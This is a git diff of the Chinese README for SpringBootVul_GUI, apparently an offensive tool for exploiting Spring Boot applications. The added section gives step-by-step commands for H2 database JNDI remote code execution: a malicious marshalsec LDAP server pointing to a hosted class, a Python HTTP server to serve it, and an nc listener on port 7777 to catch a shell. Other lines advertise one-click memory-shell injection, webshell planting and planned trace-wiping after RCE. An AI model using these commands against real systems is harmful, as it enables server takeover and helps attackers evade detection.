@@ -93,7 +93,6 @@ java -jar SpringBootVul_GUI.jar
 ## 0x04短期目标 Prepare
 
 * [x] 一键打入内存马(目前只有Spring Cloud Gateway)
-* [ ] cve-2021-21234
 * [ ] 部分RCE的痕迹一键清除
 
 ## 0x05项目演示
@@ -239,13 +238,48 @@ java -jar JNDIExploit-1.0-SNAPSHOT.jar -i ip
 
 ![](./image/image-20240921163721471.png)
 
-### #11 端点扫描
+### #11 H2数据库的JNDI的RCE
+
+漏洞利用的路径是访问恶意ladp服务器->通过转发到托管服务器的class->getshell
+
+文件读写是从template文件夹下读取模板，对vps配置替换后写到resources再编译成class
+
+1、运行恶意ladp，文件我放到resources了，可以直接使用
+
+```bash
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/\#H2DataConsole 1389
+```
+
+2、运行resources托管服务器
+
+```bash
+python -m http.server 80
+```
+
+3、监听端口
+
+```bash
+# mac
+nc -lvk 7777
+#linux
+nc -lvp 7777
+```
+
+![](./image/image-20240930112756401.png)
+
+![](./image/image-20240930112417036.png)
+
+有关JDNI高版本注入的文章可以看看
+
+https://tttang.com/archive/1405/
+
+### #12 端点扫描
 
 端点扫描经过延时降速处理，heapdump可以下载大文件，用了分块，做了个小进度条，以后优化下，textflow布局以后要改
 
 ![](./image/image-20240914013633068.png)
 
-### #12 一键上马
+### #13 一键上马
 
 ![](./image/WechatIMG1409.jpg)
 
